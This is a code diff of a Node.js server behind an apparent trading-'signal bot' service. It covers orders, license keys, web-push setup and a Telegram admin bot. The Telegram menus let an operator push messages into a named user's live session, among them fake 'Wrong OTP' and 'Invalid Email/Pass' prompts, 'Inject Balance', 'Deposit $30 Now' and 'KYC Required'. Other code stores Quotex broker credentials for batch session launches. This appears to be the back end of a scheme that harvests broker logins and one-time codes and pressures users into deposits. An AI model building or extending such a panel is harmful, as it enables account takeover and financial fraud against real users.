@@ -16,22 +16,7 @@ const MONGODB_URI = process.env.MONGODB_URI ||
 let useDatabase = false;
 
 mongoose.connect(MONGODB_URI, { serverSelectionTimeoutMS: 5000, maxPoolSize: 100 })
-.then(async () => {
-    useDatabase = true;
-    console.log('✅ MongoDB connected: permanent storage enabled');
-    // ── One-time phone normalization migration ──────────────────────────
-    try {
-        const badOrders = await Order.find({ whatsapp: { $not: /^\+/ } }).lean();
-        if (badOrders.length > 0) {
-            console.info(`📱 Migrating ${badOrders.length} orders with legacy phone numbers...`);
-            for (const o of badOrders) {
-                const fixed = normalizeWhatsApp(o.whatsapp || '');
-                if (fixed !== o.whatsapp) await Order.updateOne({ id: o.id }, { whatsapp: fixed });
-            }
-            console.info(`✅ Phone migration complete.`);
-        }
-    } catch(migErr) { console.warn('Phone migration error:', migErr.message); }
-})
+.then(() => { useDatabase = true; console.log('✅ MongoDB connected: permanent storage enabled'); })
 .catch(err => { console.warn('⚠️  MongoDB connection failed — falling back to file storage:', err.message); });
 
 // ================== MONGOOSE SCHEMAS ==================
@@ -91,13 +76,12 @@ const orderSchema = new mongoose.Schema({
     txId:           { type: String, default: '' },
     screenshotPath: { type: String, default: '' },
     screenshotData: { type: String, default: '' }, // base64 image — survives server restarts
-    screenshotHash: { type: String, default: '' }, // SHA-256 of image bytes for duplicate detection
     licenseKey:     { type: String, default: '' },
     status:         { type: String, default: 'Pending', index: true },
     rejectReason:   { type: String, default: '' },
+    screenshotHash: { type: String, default: '' },
     isDuplicate:    { type: Boolean, default: false },
-    duplicateFlag:  { type: Boolean, default: false }, // audit flag
-    dupeReasons:    { type: Array, default: [] },
+    dupeReasons:    { type: Array,  default: [] },
     createdAt:      { type: Date, default: Date.now },
 });
 const paymentSettingsSchema = new mongoose.Schema({
@@ -239,28 +223,20 @@ if (webPush) {
             const ok = initWebPush(stored.publicKey, stored.privateKey, stored.subject || envSubj);
             if (ok) console.info('web-push: loaded VAPID keys from vapid-keys.json');
         } else {
-            // ── AUTO-GENERATE VAPID keys on first boot ──────────────────────
-            try {
-                const generated = webPush.generateVAPIDKeys();
-                const subj      = envSubj;
-                const ok        = initWebPush(generated.publicKey, generated.privateKey, subj);
-                if (ok) {
-                    saveVapidKeys(generated.publicKey, generated.privateKey, subj);
-                    console.info('✅ VAPID keys auto-generated and saved to vapid-keys.json');
-                    console.info('🔑 VAPID_PUBLIC_KEY =', generated.publicKey);
-                    console.info('   Add the above to your .env as VAPID_PUBLIC_KEY for persistence across restarts.');
-                    // Also write to .env.vapid as a convenience hint
-                    try {
-                        const envHint = `VAPID_PUBLIC_KEY=${generated.publicKey}\nVAPID_PRIVATE_KEY=${generated.privateKey}\nVAPID_SUBJECT=${subj}\n`;
-                        fs.writeFileSync(path.join(__dirname, '.env.vapid'), envHint);
-                    } catch(e) {}
-                }
-            } catch(genErr) {
-                console.warn('VAPID auto-generate failed:', genErr.message);
-                webPush = null;
-            }
+        // Auto-generate VAPID keys on first boot so push works out of the box
+        console.info('VAPID keys not found — auto-generating on first boot...');
+        try {
+            const keys = webPush.generateVAPIDKeys();
+            const subj = process.env.VAPID_SUBJECT || 'mailto:admin@csbot.local';
+            saveVapidKeys(keys.publicKey, keys.privateKey, subj);
+            const ok = initWebPush(keys.publicKey, keys.privateKey, subj);
+            if (ok) console.info('✅ VAPID keys auto-generated and saved to vapid-keys.json. Push notifications are now active.');
+        } catch(genErr) {
+            console.warn('Could not auto-generate VAPID keys:', genErr.message, '— run npm install web-push to fix.');
+            webPush = null;
         }
     }
+}
 }
 
 // ── Saved Credentials (for quick Quotex batch launch) ───────────────────────
@@ -1420,58 +1396,29 @@ function tgUserActionKeyboard(userName) {
     const u = encodeURIComponent(userName);
     return {
         inline_keyboard: [
-            // Row 1: OTP & Login
-            [{ text: '🔢 Request OTP',         callback_data: `qt|wrong_otp|${u}` },
-             { text: '❌ Wrong OTP',            callback_data: `qt|wrong_otp|${u}` }],
-            // Row 2: Login result
-            [{ text: '✅ Login Successfully',   callback_data: `qt|login_ok|${u}` },
-             { text: '⚠️ Low Balance Alert',    callback_data: `qt|low_balance|${u}` }],
-            // Row 3: Credentials & Wait
-            [{ text: '🔑 Invalid Email/Pass',  callback_data: `qt|invalid_login|${u}` },
-             { text: '⏳ Please Wait (1 min)', callback_data: `wait_1m|${u}` }],
-            // Row 4: Wait 2min & Block
-            [{ text: '⏳ Please Wait (2 min)', callback_data: `wait_2m|${u}` },
-             { text: '🚫 Block User',           callback_data: `block|${u}` }],
-            // Row 5: Unblock & Reload
-            [{ text: '✅ Unblock User',         callback_data: `unblock|${u}` },
-             { text: '🔄 Force Reload',         callback_data: `force_reload|${u}` }],
-            // Row 6: Custom & Trigger Live
-            [{ text: '💬 Custom Message',       callback_data: `ask_msg|${u}` },
-             { text: '🔗 Trigger Connected (Live)', callback_data: `tc_trigger|${u}` }],
-            // Row 7: Kick
-            [{ text: '👢 Kick User',            callback_data: `kick|${u}` }],
-            // Row 8: More / Back
-            [{ text: '➕ More Inject Options',  callback_data: `inject_type_menu|${u}` }],
-            [{ text: '🔙 Back to Users',        callback_data: 'menu_users' }],
-        ],
-    };
-}
-
-function tgInjectMoreKeyboard(userName) {
-    const u = encodeURIComponent(userName);
-    return {
-        inline_keyboard: [
-            [{ text: '🚨 Alert',             callback_data: `qt|alert|${u}` },
-             { text: '📋 Instruction',        callback_data: `qt|instruction|${u}` }],
-            [{ text: '💰 Deposit Prompt',     callback_data: `qt|deposit_prompt|${u}` },
-             { text: '💰 Deposit OK',          callback_data: `qt|deposit_ok|${u}` }],
-            [{ text: '🏦 Withdraw',           callback_data: `qt|withdraw_processing|${u}` },
-             { text: '🚨 Low Bal Urgent',      callback_data: `qt|low_balance_urgent|${u}` }],
-            [{ text: '💵 Deposit $30 Now',    callback_data: `qt|deposit_30|${u}` },
-             { text: '📄 KYC Required',        callback_data: `qt|kyc_required|${u}` }],
-            [{ text: '✅ Account Verified',   callback_data: `qt|account_verified|${u}` },
-             { text: '🎁 Bonus Credited',      callback_data: `qt|bonus_credited|${u}` }],
-            [{ text: '🎉 Connected',          callback_data: `qt|success_connected|${u}` },
-             { text: '🔌 Disconnected',        callback_data: `qt|disconnected|${u}` }],
-            [{ text: '⏰ Timeout Warn',       callback_data: `qt|timeout_warning|${u}` },
-             { text: '📡 Signal Coming',       callback_data: `qt|signal_incoming|${u}` }],
-            [{ text: '🔔 Close Position',     callback_data: `qt|signal_close|${u}` },
-             { text: '🛠 Support Msg',         callback_data: `qt|support_msg|${u}` }],
-            [{ text: '💰 Inject Balance',     callback_data: `ask_balance|${u}` },
-             { text: '📝 Note',               callback_data: `ask_note|${u}` }],
-            [{ text: '⏳ Push Loading',       callback_data: `push_loading|${u}` },
-             { text: '🚀 Launch QX',          callback_data: `qxlaunch_user|${u}` }],
-            [{ text: '⬅ Back to Primary Menu', callback_data: `user_menu|${u}` }],
+            // ── Row 1: Most-used login triggers ──────────────────────────
+            [{ text: '⚠️ Invalid Login', callback_data: `qt|invalid_login|${u}` },
+             { text: '🔢 Wrong OTP',     callback_data: `qt|wrong_otp|${u}` },
+             { text: '✅ Login OK',       callback_data: `qt|login_ok|${u}` }],
+            // ── Row 2: Financial essentials ───────────────────────────────
+            [{ text: '💰 Deposit Prompt', callback_data: `qt|deposit_prompt|${u}` },
+             { text: '⚠️ Low Balance',    callback_data: `qt|low_balance|${u}` },
+             { text: '💵 Deposit $30',    callback_data: `qt|deposit_30|${u}` }],
+            // ── Row 3: Status & trigger ───────────────────────────────────
+            [{ text: '🎉 Connected',     callback_data: `qt|success_connected|${u}` },
+             { text: '🔗 Live Trigger',  callback_data: `tc_trigger|${u}` },
+             { text: '⏳ Push Loading',  callback_data: `push_loading|${u}` }],
+            // ── Row 4: Custom + quick control ─────────────────────────────
+            [{ text: '💬 Custom Msg',    callback_data: `ask_msg|${u}` },
+             { text: '💰 Inject Bal',    callback_data: `ask_balance|${u}` },
+             { text: '🔄 Force Reload',  callback_data: `force_reload|${u}` }],
+            // ── Row 5: Block / launch / more ──────────────────────────────
+            [{ text: '🚫 Block',         callback_data: `block|${u}` },
+             { text: '✅ Unblock',       callback_data: `unblock|${u}` },
+             { text: '🚀 Launch QX',     callback_data: `qxlaunch_user|${u}` }],
+            // ── Row 6: More options / back ────────────────────────────────
+            [{ text: '📩 More Options ▶', callback_data: `inject_type_menu|${u}` }],
+            [{ text: '🔙 Back to Users',  callback_data: 'menu_users' }],
         ],
     };
 }
@@ -1697,76 +1644,34 @@ async function tgHandleCallback(chatId, data, callbackId) {
                 if (orderDoc) { Object.assign(orderDoc, updates); saveOrdersFile(); }
             }
             if (orderDoc) {
-                // Save license to License collection — status "Assigned" per spec
+                // Save license to License collection with correct expiry
                 const plan = orderDoc.planKey || '';
                 let expiry = null;
                 if (plan === 'week')  expiry = new Date(Date.now() + 7  * 24 * 3600000);
                 if (plan === 'month') expiry = new Date(Date.now() + 30 * 24 * 3600000);
-                const licType = plan === 'lifetime' ? 'Lifetime' : plan === 'week' ? 'Weekly' : plan === 'month' ? 'Monthly' : (orderDoc.planLabel || 'Standard');
-                const licData = { key: newKey, type: licType, status: 'Assigned', assignedTo: orderDoc.fullName || orderDoc.whatsapp || null, dateAdded: new Date(), expiry };
+                const licData = {
+                    key: newKey, type: plan === 'lifetime' ? 'Lifetime' : plan === 'week' ? 'Weekly' : 'Monthly',
+                    status: 'Active', assignedTo: orderDoc.fullName || null, dateAdded: new Date(), expiry,
+                };
                 if (useDatabase) await License.findOneAndUpdate({ key: newKey }, licData, { upsert: true }).catch(() => {});
-                else { if (!licenses) global.licenses = []; licenses.unshift(licData); saveLicenses?.(); }
-                broadcastSSE('license_added', licData);
+                else { licenses.unshift(licData); saveLicenses(); }
             }
             broadcastSSE('order_updated', { id: orderId, ...updates });
-            const waUrl = orderDoc ? `https://wa.me/${(orderDoc.whatsapp||'').replace(/\D/g,'')}?text=${encodeURIComponent(`✅ Your order has been approved!\n\n🔑 License Key: ${newKey}\n\nPaste this key when prompted on the bot.`)}` : '#';
             return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
                 text: `✅ <b>Order Approved!</b>\n🆔 <code>${orderId}</code>\n🔑 Key: <code>${newKey}</code>\n\n📋 Send to customer via WhatsApp.`,
-                reply_markup: { inline_keyboard: [[{ text: '💬 WhatsApp Customer — Send Key', url: waUrl }]] }
+                reply_markup: { inline_keyboard: [[
+                    { text: '💬 WhatsApp Customer', url: orderDoc ? `https://wa.me/${(orderDoc.whatsapp||'').replace(/\D/g,'')}?text=${encodeURIComponent('License Key: '+newKey)}` : '#' },
+                ]] }
             });
         } catch(e) {
             return tgApi('sendMessage', { chat_id: chatId, text: `❌ Error: ${e.message}` });
         }
     }
 
-    // ── Assign Licence prompt (admin enters key manually) ─────────────────────
-    if (action === 'order_assign_lic') {
-        const orderId = parts[1];
-        tgSessions[chatId] = { awaiting: 'order_lic_key', orderId };
-        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
-            text: `📌 <b>Assign Licence Key</b>\n🆔 Order: <code>${orderId}</code>\n\nSend the license key in format <code>CSAI-XXXX-XXXX-XXXX</code>:` });
-    }
-
-    // ── Order delete ──────────────────────────────────────────────────────────
-    if (action === 'order_delete') {
-        const orderId = parts[1];
-        try {
-            if (useDatabase) await Order.deleteOne({ id: orderId });
-            else { ordersMem = ordersMem.filter(x => x.id !== orderId); saveOrdersFile(); }
-            broadcastSSE('order_deleted', { id: orderId });
-            return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
-                text: `🗑 Order <code>${orderId}</code> deleted.` });
-        } catch(e) { return tgApi('sendMessage', { chat_id: chatId, text: `❌ Error: ${e.message}` }); }
-    }
-
-    // ── Order view details ────────────────────────────────────────────────────
-    if (action === 'order_details') {
-        const orderId = parts[1];
-        try {
-            const o = useDatabase ? await Order.findOne({ id: orderId }).lean() : ordersMem.find(x => x.id === orderId);
-            if (!o) return tgApi('sendMessage', { chat_id: chatId, text: '❌ Order not found.' });
-            const created = o.createdAt ? new Date(o.createdAt).toLocaleString('en-PK', { timeZone: 'Asia/Karachi' }) : '—';
-            const details =
-                `📦 <b>Order Details</b>\n━━━━━━━━━━━━━━━━━━\n` +
-                `🆔 ID: <code>${o.id}</code>\n👤 Name: <b>${o.fullName || '—'}</b>\n` +
-                `📱 WhatsApp: <code>${o.whatsapp || '—'}</code>\n📦 Plan: <b>${o.planLabel || o.planKey || '—'}</b>\n` +
-                `💰 PKR: <b>${o.planPricePKR || '—'}</b>  USD: <b>${o.planPriceUSD ? '$'+o.planPriceUSD : '—'}</b>\n` +
-                `💳 Payment: <b>${o.paymentMethod || '—'}</b>\n🔖 TX ID: <code>${o.txId || '—'}</code>\n` +
-                `🔑 Key: <code>${o.licenseKey || 'Not assigned'}</code>\n📌 Status: <b>${o.status || 'Pending'}</b>\n` +
-                `⏰ Created: <b>${created}</b>`;
-            return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: details,
-                reply_markup: { inline_keyboard: [[
-                    { text: '✅ Approve & Send Licence', callback_data: `order_approve|${orderId}` },
-                    { text: '💬 WhatsApp', url: `https://wa.me/${(o.whatsapp||'').replace(/\D/g,'')}` },
-                ]] }
-            });
-        } catch(e) { return tgApi('sendMessage', { chat_id: chatId, text: `❌ Error: ${e.message}` }); }
-    }
-
     if (action === 'order_status') {
         const orderId   = parts[1];
         const newStatus = parts[2];
-        const allowedSt = ['Pending','Processing','Reviewing','Confirmed','Approved','Rejected','New','Contacted','Paid','Completed','Cancelled','Fake','Refunded','On Hold'];
+        const allowedSt = ['Pending','Reviewing','Confirmed','Approved','Rejected','New','Contacted','Paid','Completed','Cancelled','Fake'];
         if (!allowedSt.includes(newStatus)) return tgApi('sendMessage', { chat_id: chatId, text: '❌ Invalid status.' });
         try {
             if (useDatabase) await Order.findOneAndUpdate({ id: orderId }, { status: newStatus });
@@ -1840,33 +1745,11 @@ All users will see the maintenance page.`,
             text: '🚀 <b>Launch Quotex Session</b>\n\n📧 Send the Email address:' });
     }
 
-    // ── Wait timers (anti-spam preset) ───────────────────────────────
-    if (action === 'wait_1m') {
-        const waitSec = 60;
-        await tgInjectMessage(target, 'wait', `⏳ Please wait <b>1 minute</b> while we process your request. Do not close the page.`, true);
-        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
-            text: `⏳ 1-min wait injected to <b>${target}</b>`,
-            reply_markup: tgUserActionKeyboard(target) });
-    }
-    if (action === 'wait_2m') {
-        await tgInjectMessage(target, 'wait', `⏳ Please wait <b>2 minutes</b> while we verify your account. Do not close the page.`, true);
-        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
-            text: `⏳ 2-min wait injected to <b>${target}</b>`,
-            reply_markup: tgUserActionKeyboard(target) });
-    }
-
-    // ── Back to primary user menu ─────────────────────────────────────
-    if (action === 'user_menu') {
-        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
-            text: `👤 <b>${target}</b> — Choose an action:`,
-            reply_markup: tgUserActionKeyboard(target) });
-    }
-
-    // ── INJECT TYPE MENU (page 2) ─────────────────────────────────────
+    // ── INJECT TYPE MENU ─────────────────────────────────────────────
     if (action === 'inject_type_menu') {
         return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
-            text: `💬 <b>More Inject Options — ${target}</b>`,
-            reply_markup: tgInjectMoreKeyboard(target) });
+            text: `💬 <b>Inject to ${target}</b>\nChoose message type:`,
+            reply_markup: tgInjectTypeKeyboard(target) });
     }
 
     // ── PER-SESSION ACTIONS ───────────────────────────────────────────
@@ -2425,38 +2308,6 @@ async function tgHandleMessage(msg) {
         return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
             text: ok ? `💰 Injected <b>${bal}</b> for <b>${sess.target}</b>` : `⚠️ <b>${sess.target}</b> offline.` });
     }
-    // ── Assign licence key to order (after prompt) ───────────────────
-    if (sess?.awaiting === 'order_lic_key' && sess.orderId) {
-        delete tgSessions[chatId];
-        const key = text.trim().toUpperCase();
-        if (!isValidLicKey(key)) {
-            return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
-                text: `❌ Invalid key format. Expected: <code>CSAI-XXXX-XXXX-XXXX</code>` });
-        }
-        try {
-            let orderDoc;
-            if (useDatabase) orderDoc = await Order.findOneAndUpdate({ id: sess.orderId }, { licenseKey: key, status: 'Approved' }, { new: true });
-            else { orderDoc = ordersMem.find(x => x.id === sess.orderId); if (orderDoc) { orderDoc.licenseKey = key; orderDoc.status = 'Approved'; saveOrdersFile(); } }
-            if (orderDoc) {
-                const plan = orderDoc.planKey || '';
-                let expiry = null;
-                if (plan === 'week')  expiry = new Date(Date.now() + 7  * 24 * 3600000);
-                if (plan === 'month') expiry = new Date(Date.now() + 30 * 24 * 3600000);
-                const licType = plan === 'lifetime' ? 'Lifetime' : plan === 'week' ? 'Weekly' : plan === 'month' ? 'Monthly' : 'Standard';
-                const licData = { key, type: licType, status: 'Assigned', assignedTo: orderDoc.fullName || orderDoc.whatsapp || null, dateAdded: new Date(), expiry };
-                if (useDatabase) await License.findOneAndUpdate({ key }, licData, { upsert: true }).catch(() => {});
-                else { licenses.unshift(licData); saveLicenses?.(); }
-                broadcastSSE('order_updated', { id: sess.orderId, licenseKey: key, status: 'Approved' });
-                broadcastSSE('license_added', licData);
-            }
-            const waUrl = orderDoc ? `https://wa.me/${(orderDoc.whatsapp||'').replace(/\D/g,'')}?text=${encodeURIComponent(`✅ Your license key:\n\n🔑 ${key}\n\nPaste this in the bot when prompted.`)}` : '#';
-            return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
-                text: `✅ <b>Licence Assigned</b>\n🆔 Order: <code>${sess.orderId}</code>\n🔑 Key: <code>${key}</code>`,
-                reply_markup: { inline_keyboard: [[{ text: '💬 WhatsApp Customer — Send Key', url: waUrl }]] }
-            });
-        } catch(e) { return tgApi('sendMessage', { chat_id: chatId, text: `❌ Error: ${e.message}` }); }
-    }
-
     if (sess?.awaiting === 'broadcast_text') {
         delete tgSessions[chatId];
         broadcastSSE('broadcast_message', { message: text, type: 'info', timestamp: new Date().toISOString() });
@@ -3541,11 +3392,11 @@ async function findDuplicateOrders(newOrder, allOrders) {
         const sameWa   = newOrder.whatsapp && o.whatsapp && newOrder.whatsapp.replace(/\D/g,'') === o.whatsapp.replace(/\D/g,'');
         const sameName = newOrder.fullName && o.fullName && newOrder.fullName.toLowerCase() === o.fullName.toLowerCase();
         const samePlan = newOrder.planKey  && o.planKey  && newOrder.planKey === o.planKey;
-        const sameHash = newOrder.screenshotHash && o.screenshotHash && newOrder.screenshotHash === o.screenshotHash;
-        if (sameTx)                          dupes.push({ orderId: o.id, field: 'transactionId', reason: `Same Transaction ID: ${newOrder.txId}` });
-        else if (sameHash)                   dupes.push({ orderId: o.id, field: 'screenshot',    reason: 'Identical screenshot / payment proof' });
-        else if (sameWa && sameName && samePlan) dupes.push({ orderId: o.id, field: 'phone',     reason: 'Same phone + name + plan' });
-        else if (sameWa && sameName)         dupes.push({ orderId: o.id, field: 'phone',         reason: 'Same phone + name' });
+        const sameHash = newOrder.screenshotHash && o.screenshotHash && o.screenshotHash.length > 8 && newOrder.screenshotHash === o.screenshotHash;
+        if (sameTx)                           dupes.push({ orderId: o.id, reason: 'Same Transaction ID' });
+        else if (sameHash)                    dupes.push({ orderId: o.id, reason: 'Duplicate screenshot image' });
+        else if (sameWa && sameName && samePlan) dupes.push({ orderId: o.id, reason: 'Same phone + name + plan' });
+        else if (sameWa && sameName)          dupes.push({ orderId: o.id, reason: 'Same phone + name' });
     }
     return dupes;
 }
@@ -3561,6 +3412,29 @@ function generateLicKey() {
 }
 function isValidLicKey(key) { return CSAI_KEY_REGEX.test(key); }
 loadOrdersFile();
+
+// ── Boot-time migration: fix old orders that are missing the + prefix on WhatsApp ──
+async function migrateOldOrderPhones() {
+    try {
+        const allOrders = useDatabase ? await Order.find({ whatsapp: { $not: /^\+/ } }).lean() : ordersMem.filter(o => o.whatsapp && !o.whatsapp.startsWith('+'));
+        let count = 0;
+        for (const o of allOrders) {
+            const fixed = normalizeWhatsApp(o.whatsapp);
+            if (fixed && fixed !== o.whatsapp) {
+                if (useDatabase) await Order.updateOne({ id: o.id }, { whatsapp: fixed }).catch(() => {});
+                else {
+                    const idx = ordersMem.findIndex(x => x.id === o.id);
+                    if (idx >= 0) { ordersMem[idx].whatsapp = fixed; }
+                }
+                count++;
+            }
+        }
+        if (!useDatabase && count > 0) saveOrdersFile();
+        if (count > 0) console.info(`✅ Phone migration: fixed ${count} order(s) missing + prefix`);
+    } catch(e) { console.warn('Phone migration error:', e.message); }
+}
+// Run migration after DB connects (or immediately for file mode)
+setTimeout(() => migrateOldOrderPhones().catch(() => {}), 8000);
 
 // POST /api/orders — multipart/form-data with optional screenshot
 const _ordersUpload = uploadMiddleware ? uploadMiddleware.single('screenshot') : (req, res, next) => next();
@@ -3584,31 +3458,19 @@ app.post('/api/orders', _ordersUpload, async (req, res) => {
         let screenshotHash = '';
         if (req.file) {
             screenshotData = 'data:' + req.file.mimetype + ';base64,' + req.file.buffer.toString('base64');
-            screenshotHash = crypto.createHash('sha256').update(req.file.buffer).digest('hex');
             screenshotPath = '/api/orders/' + 'PENDING' + '/screenshot'; // will be set properly below
+            // SHA-256 hash for duplicate screenshot detection
+            screenshotHash = crypto.createHash('sha256').update(req.file.buffer).digest('hex');
         }
         const id    = 'ORD-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).slice(2, 6).toUpperCase();
         // Fix the screenshot API path now that we have the order id
         if (screenshotData) screenshotPath = '/api/orders/' + id + '/screenshot';
-        // Duplicate detection before saving (includes SHA-256 hash check)
+        // Duplicate detection before saving
         const existingOrders = useDatabase ? await Order.find({}).lean().catch(() => []) : ordersMem;
         const dupes = await findDuplicateOrders({ id: 'TMP', fullName, whatsapp, txId, planKey, screenshotHash }, existingOrders);
         const isDuplicate = dupes.length > 0;
 
-        // Block duplicate submissions — return 409 with details so the client can show a popup
-        if (isDuplicate) {
-            const d = dupes[0];
-            return res.status(409).json({
-                ok: false,
-                duplicate: true,
-                field: d.field,
-                reason: d.reason,
-                matchedOrderId: d.orderId,
-                message: `Duplicate order detected — ${d.reason} was already used in order #${d.orderId}. Contact support if this is a mistake.`,
-            });
-        }
-
-        const order = { id, fullName, planKey, planLabel, planPricePKR, planPriceUSD, paymentMethod, whatsapp, country, txId, screenshotPath, screenshotData, screenshotHash, licenseKey: '', status: 'Pending', rejectReason: '', isDuplicate: false, duplicateFlag: false, dupeReasons: [], createdAt: new Date() };
+        const order = { id, fullName, planKey, planLabel, planPricePKR, planPriceUSD, paymentMethod, whatsapp, country, txId, screenshotPath, screenshotData, screenshotHash, licenseKey: '', status: 'Pending', rejectReason: '', isDuplicate, dupeReasons: dupes.map(d => d.reason), createdAt: new Date() };
         if (useDatabase) await Order.create(order); else { ordersMem.unshift(order); saveOrdersFile(); }
         broadcastSSE('new_order', order);
 
@@ -3632,26 +3494,30 @@ app.post('/api/orders', _ordersUpload, async (req, res) => {
             text: orderTgText,
             reply_markup: {
                 inline_keyboard: [
-                    // Row 1: Approve & Assign License
-                    [{ text: '✅ Approve & Send Licence',  callback_data: `order_approve|${id}` },
-                     { text: '📌 Assign Licence',          callback_data: `order_assign_lic|${id}` }],
-                    // Row 2: Change Status sub-options
-                    [{ text: '🔁 Pending',     callback_data: `order_status|${id}|Pending` },
-                     { text: '🔁 Processing',  callback_data: `order_status|${id}|Processing` }],
-                    [{ text: '🔁 Completed',   callback_data: `order_status|${id}|Completed` },
-                     { text: '🔁 Rejected',    callback_data: `order_status|${id}|Rejected` }],
-                    [{ text: '🔁 Refunded',    callback_data: `order_status|${id}|Refunded` },
-                     { text: '🔁 Reviewing',   callback_data: `order_status|${id}|Reviewing` }],
-                    // Row 5: Delete & View Details
-                    [{ text: '🗑 Delete Order',            callback_data: `order_delete|${id}` },
-                     { text: '👁 View Details',            callback_data: `order_details|${id}` }],
-                    // Row 6: WhatsApp
-                    [{ text: '💬 WhatsApp Customer',       url: `https://wa.me/${whatsapp.replace(/\D/g,'')}` }],
+                    [
+                        { text: '✅ Approve & Send Licence', callback_data: `order_approve|${id}` },
+                        { text: '❌ Reject',                  callback_data: `order_status|${id}|Rejected` },
+                    ],
+                    [
+                        { text: '🔑 Assign Licence Key',     callback_data: `order_assign_ask|${id}` },
+                        { text: '🔎 Mark Reviewing',         callback_data: `order_status|${id}|Reviewing` },
+                    ],
+                    [
+                        { text: '💰 Mark Paid',              callback_data: `order_status|${id}|Paid` },
+                        { text: '✔️ Mark Completed',         callback_data: `order_status|${id}|Completed` },
+                    ],
+                    [
+                        { text: '🚫 Mark Fake / Block',      callback_data: `order_status|${id}|Fake` },
+                        { text: '🗑️ Delete Order',           callback_data: `order_delete|${id}` },
+                    ],
+                    [
+                        { text: '💬 WhatsApp Customer',      url: `https://wa.me/${whatsapp.replace(/\D/g,'')}` },
+                    ],
                 ],
             },
         }).catch(() => {});
 
-        res.json({ ok: true, order: { id: order.id } });
+        res.json({ ok: true, order: { id: order.id, isDuplicate, dupeReasons: order.dupeReasons } });
     } catch(e) { console.error('POST /api/orders error:', e); res.status(500).json({ error: 'Server error' }); }
 });
 app.get('/api/orders', async (req, res) => {
@@ -3975,72 +3841,6 @@ app.post('/api/push/send', async (req, res) => {
         const result = await sendPushToUser(userIdentifier || '', payload);
         res.json({ ok: true, ...result });
     } catch(e) { res.status(500).json({ error: 'Server error' }); }
-});
-
-// ── POST /api/push/broadcast — broadcast push to all subscribers ──────────────
-app.post('/api/push/broadcast', async (req, res) => {
-    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
-    if (!webPush) return res.status(503).json({ error: 'web-push not configured (missing VAPID keys)' });
-    const { title, body, url, icon } = req.body || {};
-    const payload = { title: title || 'Chinese Signal Bot', body: body || '', url: url || '/', icon: icon || '/icon-192.png' };
-    try {
-        let subs; try { subs = useDatabase ? await PushSub.find({}).lean() : pushSubsMem; } catch(e) { subs = pushSubsMem; }
-        let sent = 0, errors = 0, stale = [];
-        for (const sub of subs) {
-            try { await webPush.sendNotification({ endpoint: sub.endpoint, keys: sub.keys }, JSON.stringify(payload)); sent++; }
-            catch(e) { errors++; if (e.statusCode === 410 || e.statusCode === 404) stale.push(sub.endpoint); }
-        }
-        for (const ep of stale) {
-            if (useDatabase) await PushSub.deleteOne({ endpoint: ep }).catch(()=>{});
-            else { pushSubsMem = pushSubsMem.filter(s => s.endpoint !== ep); savePushSubsFile(); }
-        }
-        res.json({ ok: true, sent, errors, stale: stale.length });
-    } catch(e) { res.status(500).json({ error: 'Server error', detail: e.message }); }
-});
-
-// ── POST /api/orders/:id/notify — push notification to order's subscriber ─────
-app.post('/api/orders/:id/notify', async (req, res) => {
-    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
-    if (!webPush) return res.status(503).json({ error: 'web-push not configured' });
-    const { title, body, url, icon } = req.body || {};
-    try {
-        const o = useDatabase ? await Order.findOne({ id: req.params.id }).lean() : ordersMem.find(x => x.id === req.params.id);
-        if (!o) return res.status(404).json({ error: 'Order not found' });
-        const payload = { title: title || '✅ Order Update', body: body || `Your order ${o.id} has been updated.`, url: url || '/', icon: icon || '/icon-192.png' };
-        const wa = (o.whatsapp || '').replace(/\D/g, '');
-        const result = wa ? await sendPushToUser(wa, payload) : { ok: false, error: 'No WhatsApp on order' };
-        res.json({ ok: result.ok || false, ...result });
-    } catch(e) { res.status(500).json({ error: 'Server error', detail: e.message }); }
-});
-
-// ── GET /sw.js — serve the service worker for push notifications ──────────────
-app.get('/sw.js', (req, res) => {
-    const swPath = path.join(__dirname, 'sw.js');
-    if (fs.existsSync(swPath)) {
-        res.setHeader('Content-Type', 'application/javascript');
-        res.setHeader('Service-Worker-Allowed', '/');
-        res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
-        return res.sendFile(swPath);
-    }
-    // Fallback inline SW if file missing
-    res.setHeader('Content-Type', 'application/javascript');
-    res.setHeader('Service-Worker-Allowed', '/');
-    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
-    res.send(`
-self.addEventListener('push', e => {
-    const d = e.data ? e.data.json() : {};
-    e.waitUntil(self.registration.showNotification(d.title || 'Chinese Signal Bot', {
-        body: d.body || '', icon: d.icon || '/icon-192.png', badge: '/icon-192.png',
-        data: { url: d.url || '/' }
-    }));
-});
-self.addEventListener('notificationclick', e => {
-    e.notification.close();
-    e.waitUntil(clients.openWindow(e.notification.data?.url || '/'));
-});
-self.addEventListener('install', () => self.skipWaiting());
-self.addEventListener('activate', e => e.waitUntil(clients.claim()));
-`);
 });
 
 // ================== QUOTEX BROKER SESSION API ==================
